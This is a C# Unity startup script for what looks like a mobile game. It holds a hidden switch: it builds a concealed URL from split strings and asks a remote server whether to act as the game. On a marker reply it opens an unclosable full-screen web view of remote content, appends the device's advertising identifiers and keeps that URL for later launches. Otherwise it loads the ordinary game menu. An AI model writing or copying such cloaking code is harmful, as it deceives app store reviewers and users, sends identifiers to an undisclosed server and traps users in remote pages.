using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class MainNT : MonoBehaviour
{    
    public List<string> splitters;
    [HideInInspector] public string oneNTName = "";
    [HideInInspector] public string twoNTName = "";

    private void Awake()
    {
        if (PlayerPrefs.GetInt("idfaNT") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { oneNTName = advertisingId; });
        }
    }
    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("UrlNTlink", string.Empty) != string.Empty)
            {
                WEBNTScan(PlayerPrefs.GetString("UrlNTlink"));
            }
            else
            {
                foreach (string n in splitters)
                {
                    twoNTName += n;
                }
                StartCoroutine(IENUMENATORNT());
            }
        }
        else
        {
            StartNT();
        }
    }

    private void StartNT()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene("mainMenu");
    }

    private IEnumerator IENUMENATORNT()
    {
        using (UnityWebRequest nt = UnityWebRequest.Get(twoNTName))
        {

            yield return nt.SendWebRequest();
            if (nt.isNetworkError)
            {
                StartNT();
            }
            int timingNT = 7;
            while (PlayerPrefs.GetString("glrobo", "") == "" && timingNT > 0)
            {
                yield return new WaitForSeconds(1);
                timingNT--;
            }
            try
            {
                if (nt.result == UnityWebRequest.Result.Success)
                {
                    if (nt.downloadHandler.text.Contains("NnjTgrs"))
                    {

                        try
                        {
                            var subs = nt.downloadHandler.text.Split('|');
                            WEBNTScan(subs[0] + "?idfa=" + oneNTName, subs[1], int.Parse(subs[2]));
                        }
                        catch
                        {
                            WEBNTScan(nt.downloadHandler.text + "?idfa=" + oneNTName + "&gaid=" + PlayerPrefs.GetString("glrobo", ""));
                        }
                    }
                    else
                    {
                        StartNT();
                    }
                }
                else
                {
                    StartNT();
                }
            }
            catch
            {
                StartNT();
            }
        }
    }

    private void WEBNTScan(string UrlNTlink, string NamingNT = "", int pix = 70)
    {        
        UniWebView.SetAllowInlinePlay(true);
        var _linksNT = gameObject.AddComponent<UniWebView>();
        _linksNT.SetToolbarDoneButtonText("");
        switch (NamingNT)
        {
            case "0":
                _linksNT.SetShowToolbar(true, false, false, true);
                break;
            default:
                _linksNT.SetShowToolbar(false);
                break;
        }
        _linksNT.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        _linksNT.OnShouldClose += (view) =>
        {
            return false;
        };
        _linksNT.SetSupportMultipleWindows(true);
        _linksNT.SetAllowBackForwardNavigationGestures(true);
        _linksNT.OnMultipleWindowOpened += (view, windowId) =>
        {
            _linksNT.SetShowToolbar(true);

        };
        _linksNT.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (NamingNT)
            {
                case "0":
                    _linksNT.SetShowToolbar(true, false, false, true);
                    break;
                default:
                    _linksNT.SetShowToolbar(false);
                    break;
            }
        };
        _linksNT.OnOrientationChanged += (view, orientation) =>
        {
            _linksNT.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        };
        _linksNT.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("UrlNTlink", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("UrlNTlink", url);
            }
        };
        _linksNT.Load(UrlNTlink);
        _linksNT.Show();
    }
}
